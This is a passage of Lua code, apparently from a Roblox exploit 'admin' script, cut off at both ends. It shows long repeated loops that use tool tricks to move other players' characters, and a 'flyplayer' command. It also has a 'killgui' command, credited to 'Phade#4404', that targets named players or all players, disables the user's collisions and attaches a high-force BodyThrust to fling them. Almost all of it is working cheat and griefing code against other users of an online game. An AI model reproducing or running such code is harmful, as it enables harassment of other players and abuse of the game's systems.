if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end
for i, v in pairs(game.Players:GetPlayers()) do
if v and v.Name ~= game.Players.LocalPlayer.Name then
  
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
  
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = game.Workspace.Terrain
  wait()
  v.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.rightVector)

end
wait(0.01)

end

end)

addcmd('mario', {'playsong'},
function(args,speaker)
for a,b in pairs(game.Players:GetPlayers())do 
b.Character.Head.Landing:Play()b.Character.Head.Died:Play()
wait(.1)b.Character.Head.Died:Stop()
wait()b.Character.Head.Died:Play()wait(.1)
b.Character.Head.Died:Stop()wait(.2)b.Character.Head.Landing:Play()
b.Character.Head.Died:Play()wait(.1)b.Character.Head.Died:Stop()
wait(.2)b.Character.Head.Landing:Play()b.Character.Head.Died:Play()
wait(.1)b.Character.Head.Died:Stop()wait()
b.Character.Head.Died:Play()wait(.1)b.Character.Head.Died:Stop()
wait(.2)b.Character.Head.Landing:Play()b.Character.Head.Died:Play()
wait(.5)b.Character.Head.Died:Stop()wait(.2)
b.Character.Head.Landing:Play()b.Character.Head.Splash:Play()
b.Character.Head.Died:Play()wait(.25)b.Character.Head.Splash:Stop()
b.Character.Head.Died:Stop() end
end)

addcmd('flyplayer', {'fp'},
function(args,speaker)
local players = getPlayer(args[1], speaker)
	if tools(Players.LocalPlayer) then
		for i,v in pairs(players)do
	local Target = Players[v]
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait()
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait()
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
end
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
wait()
repeat wait()
  until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local mouse = game.Players.LocalPlayer:GetMouse()
repeat wait() until mouse
local plr = game.Players.LocalPlayer
local torso = plr.Character.Torso
local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local maxspeed = 50
local speed = 0

function Fly()
local bg = Instance.new("BodyGyro", torso)
bg.P = 9e4
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = torso.CFrame
local bv = Instance.new("BodyVelocity", torso)
bv.velocity = Vector3.new(0,0.1,0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
repeat wait()
plr.Character.Humanoid.PlatformStand = true
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
speed = speed+.5+(speed/maxspeed)
if speed > maxspeed then
speed = maxspeed
end
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
speed = speed-1
if speed < 0 then
speed = 0
end
end
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
else
bv.velocity = Vector3.new(0,0.1,0)
end
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
until not flying
ctrl = {f = 0, b = 0, l = 0, r = 0}
lastctrl = {f = 0, b = 0, l = 0, r = 0}
speed = 0
bg:Destroy()
bv:Destroy()
plr.Character.Humanoid.PlatformStand = false
end
mouse.KeyDown:connect(function(key)
if key:lower() == "e" then
if flying then flying = false
else
flying = true
Fly()
end
elseif key:lower() == "w" then
ctrl.f = 1
elseif key:lower() == "s" then
ctrl.b = -1
elseif key:lower() == "a" then
ctrl.l = -1
elseif key:lower() == "d" then
ctrl.r = 1
end
end)
mouse.KeyUp:connect(function(key)
if key:lower() == "w" then
ctrl.f = 0
elseif key:lower() == "s" then
ctrl.b = 0
elseif key:lower() == "a" then
ctrl.l = 0
elseif key:lower() == "d" then
ctrl.r = 0
end
end)
Fly()
game.Players.LocalPlayer.Character.Humanoid.PlayformStand = false
end
end
end)

addcmd('killgui', {},
function(args,speaker)
local KillGUI = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local Frame_2 = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Kill = Instance.new("TextButton")
local TextButton_Roundify_12px = Instance.new("ImageLabel")
local Target = Instance.new("TextBox")
local TextBox_Roundify_12px = Instance.new("ImageLabel")
local Exit = Instance.new("TextButton")
local Time = Instance.new("TextBox")
local TextBox_Roundify_12px_2 = Instance.new("ImageLabel")
local TextLabel_3 = Instance.new("TextLabel")
--Properties:
KillGUI.Name = "KillGUI"
KillGUI.Parent = game.CoreGui

Frame.Name = "Frame"
Frame.Parent = KillGUI
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.Position = UDim2.new(0.0383211672, 0, 0.308764935, 0)
Frame.Size = UDim2.new(0, 180, 0, 219)
Frame.Image = "rbxassetid://2260429633"
Frame.ImageColor3 = Color3.new(0.117647, 0.117647, 0.117647)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(12, 12, 13, 13)
Frame.Selectable = true
Frame.Active = true
Frame.Draggable = true

Frame_2.Name = "Frame"
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.new(1, 1, 1)
Frame_2.BackgroundTransparency = 1
Frame_2.Position = UDim2.new(0, 0, -0.041420117, 0)
Frame_2.Size = UDim2.new(0, 180, 0, 36)
Frame_2.Image = "rbxassetid://2260429633"
Frame_2.ImageColor3 = Color3.new(0.8, 0.8, 0.8)
Frame_2.ScaleType = Enum.ScaleType.Slice
Frame_2.SliceCenter = Rect.new(12, 12, 13, 13)

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.new(0.8, 0.8, 0.8)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0.68350327, 0)
TextLabel.Size = UDim2.new(0, 180, 0, 16)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 14

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.Position = UDim2.new(0, 0, 0.111111112, 0)
TextLabel_2.Size = UDim2.new(0, 147, 0, 36)
TextLabel_2.Font = Enum.Font.SciFi
TextLabel_2.Text = "Kill GUI By Phade#4404"
TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true

Kill.Name = "Kill"
Kill.Parent = Frame
Kill.BackgroundColor3 = Color3.new(1, 1, 1)
Kill.BackgroundTransparency = 1
Kill.BorderSizePixel = 0
Kill.Position = UDim2.new(0.13333334, 0, 0.231177166, 0)
Kill.Size = UDim2.new(0, 132, 0, 32)
Kill.ZIndex = 2
Kill.Font = Enum.Font.SciFi
Kill.Text = "Destroy"
Kill.TextColor3 = Color3.new(1, 1, 1)
Kill.TextSize = 14

TextButton_Roundify_12px.Name = "TextButton_Roundify_12px"
TextButton_Roundify_12px.Parent = Kill
TextButton_Roundify_12px.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_Roundify_12px.BackgroundTransparency = 1
TextButton_Roundify_12px.Size = UDim2.new(1, 0, 1.00000024, 0)
TextButton_Roundify_12px.Image = "rbxassetid://2260429633"
TextButton_Roundify_12px.ImageColor3 = Color3.new(0.0823529, 0.0823529, 0.0823529)
TextButton_Roundify_12px.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_12px.SliceCenter = Rect.new(12, 12, 13, 13)

Target.Name = "Target"
Target.Parent = Frame
Target.BackgroundColor3 = Color3.new(1, 1, 1)
Target.BackgroundTransparency = 1
Target.BorderSizePixel = 0
Target.Position = UDim2.new(0.13333334, 0, 0.719581962, 0)
Target.Size = UDim2.new(0, 132, 0, 44)
Target.ZIndex = 3
Target.Font = Enum.Font.SciFi
Target.Text = "C0de"
Target.TextColor3 = Color3.new(1, 1, 1)
Target.TextSize = 14

TextBox_Roundify_12px.Name = "TextBox_Roundify_12px"
TextBox_Roundify_12px.Parent = Target
TextBox_Roundify_12px.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox_Roundify_12px.BackgroundTransparency = 1
TextBox_Roundify_12px.Size = UDim2.new(1, 0, 1, 0)
TextBox_Roundify_12px.Image = "rbxassetid://2260429633"
TextBox_Roundify_12px.ImageColor3 = Color3.new(0.0823529, 0.0823529, 0.0823529)
TextBox_Roundify_12px.ScaleType = Enum.ScaleType.Slice
TextBox_Roundify_12px.SliceCenter = Rect.new(12, 12, 13, 13)

Exit.Name = "Exit"
Exit.Parent = Frame
Exit.BackgroundColor3 = Color3.new(1, 1, 1)
Exit.BackgroundTransparency = 1
Exit.Position = UDim2.new(0.766666651, 0, -0.041420117, 0)
Exit.Size = UDim2.new(0, 42, 0, 40)
Exit.Font = Enum.Font.SciFi
Exit.Text = "X"
Exit.TextColor3 = Color3.new(0, 0, 0)
Exit.TextSize = 20
Exit.TextWrapped = true

Time.Name = "Time"
Time.Parent = Frame
Time.BackgroundColor3 = Color3.new(1, 1, 1)
Time.BackgroundTransparency = 1
Time.BorderSizePixel = 0
Time.Position = UDim2.new(0.172222227, 0, 0.431910694, 0)
Time.Size = UDim2.new(0, 116, 0, 31)
Time.ZIndex = 3
Time.Font = Enum.Font.SciFi
Time.Text = "1"
Time.TextColor3 = Color3.new(1, 1, 1)
Time.TextSize = 14

TextBox_Roundify_12px_2.Name = "TextBox_Roundify_12px"
TextBox_Roundify_12px_2.Parent = Time
TextBox_Roundify_12px_2.BackgroundColor3 = Color3.new(1, 1, 1)
TextBox_Roundify_12px_2.BackgroundTransparency = 1
TextBox_Roundify_12px_2.Position = UDim2.new(0, 0, 1.1920929e-07, 0)
TextBox_Roundify_12px_2.Size = UDim2.new(1, 0, 1, 0)
TextBox_Roundify_12px_2.Image = "rbxassetid://2260429633"
TextBox_Roundify_12px_2.ImageColor3 = Color3.new(0.0823529, 0.0823529, 0.0823529)
TextBox_Roundify_12px_2.ScaleType = Enum.ScaleType.Slice
TextBox_Roundify_12px_2.SliceCenter = Rect.new(12, 12, 13, 13)

TextLabel_3.Parent = Time
TextLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.Position = UDim2.new(-0.146551728, 0, 1, 0)
TextLabel_3.Size = UDim2.new(0, 152, 0, 26)
TextLabel_3.Font = Enum.Font.SciFi
TextLabel_3.Text = "Time on target"
TextLabel_3.TextColor3 = Color3.new(1, 1, 1)
TextLabel_3.TextSize = 14
-- Scripts:

Exit.MouseButton1Click:connect(function()
KillGUI:Destroy()
end)

function GetPlayer(String)
local Found = {}
local strl = String:lower()
if strl == "all" then
for i,v in pairs(game.Players:GetPlayers()) do
table.insert(Found,v)
end
elseif strl == "others" then
for i,v in pairs(game.Players:GetPlayers()) do
if v.Name ~= game.Players.LocalPlayer.Name then
table.insert(Found,v)
end
end 
else
for i,v in pairs(game.Players:GetPlayers()) do
if v.Name:lower():sub(1, #String) == String:lower() then
table.insert(Found,v)
end
end 
end
return Found 
end

Kill.MouseButton1Click:connect(function()
for i,v in pairs(GetPlayer(Target.Text)) do
local Target = game.Players:FindFirstChild("Predecoris")
local Torso = game.Players.LocalPlayer.Character.HumanoidRootPart
local SavedPos = Torso.CFrame
local Active = true
local TimeDelay = Time.Text
local POWER = 9e5

game:GetService('RunService').Stepped:connect(function()
if Active == true then
if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
game.Players.LocalPlayer.Character.Head.CanCollide = false
game.Players.LocalPlayer.Character.Torso.CanCollide = false
game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
POWER = 9e5
else
if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
game.Players.LocalPlayer.Character.Head.CanCollide = false
game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
POWER = 9e4
end
end
end
end)

local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
